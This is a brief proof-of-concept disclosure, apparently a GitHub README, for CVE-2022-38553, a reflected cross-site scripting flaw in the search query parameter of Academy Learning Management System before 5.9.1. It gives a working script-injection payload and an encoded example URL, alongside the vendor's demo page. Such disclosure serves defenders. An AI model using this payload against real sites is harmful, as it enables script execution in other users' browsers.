# CVE-2022-38553
CROSS SITE SCRIPTING (XSS) ON "ACADEMY LEARNING MANAGEMENT SYSTEM" < v5.9.1 - PROOF OF CONCEPT (POC) CVE-2022-38553

Exploit Title: ACADEMY LEARNING MANAGEMENT SYSTEM < v5.9.1 - Cross Site Scripting (XSS) <br/>
CVE ID: CVE-2022-38553<br/>
Exploit Author: 4websecurity<br/>
Author's webpage: https://4websecurity.com<br/>
Date: 16-08-2022<br/>
Vendor Homepage: https://creativeitem.com<br/>
Version: up to 5.9.1<br/>
Vendor Demo page: https://demo.creativeitem.com/academy/home/<br/>

Reference:<br/>
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-38553<br/>
https://www.openbugbounty.org/reports/2849933/<br/>
https://cve.report/CVE-2022-38553<br/>
https://nvd.nist.gov/vuln/detail/CVE-2022-38553<br/>
https://youtu.be/yFiZffHoeKs<br/>

Vulnerability field:<br/>
- Search parameter (search?query)<br/>

Cross-site scripting (XSS) vulnerability in ACADEMY LEARNING MANAGEMENT SYSTEM <5.9.1 allows remote attackers to inject arbitrary web script or HTML via the search?query parameter.<br/>


Proof Of Concept (POC):<br/>
https://example.com/search?query=%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E<br/>

Payload:<br/> 
"><script>alert("XSS")</script><br/>

POC VIDEO:<br/>
[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/yFiZffHoeKs/0.jpg)](https://www.youtube.com/watch?v=yFiZffHoeKs)<br/>

Security Risk:<br/>
This security vulnerability allows to execute arbitrary JavaScript code in user browser if they access URL prepared by attackers.
